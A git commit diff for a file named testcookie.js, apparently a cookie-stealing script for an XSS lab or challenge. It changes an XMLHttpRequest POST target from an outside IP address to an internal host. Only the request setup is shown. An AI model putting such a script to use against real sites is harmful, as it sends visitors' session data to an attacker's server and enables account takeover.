c40e1b26f9be5be8a9ffeaf318770d6cba714dc9
zer0p0int <81251950+zer0p0intvvv@users.noreply.github.com>
2024-05-06 20:46:36 +0800

    Update testcookie.js

--- testcookie.js
+++ testcookie.js
@@ -1,5 +1,5 @@
 var xhr = new XMLHttpRequest();
-xhr.open('POST', 'http://39.101.137.200:7745/send');
+xhr.open('POST', 'http://web:5000/send');
 xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
 
 xhr.onreadystatechange = function() {
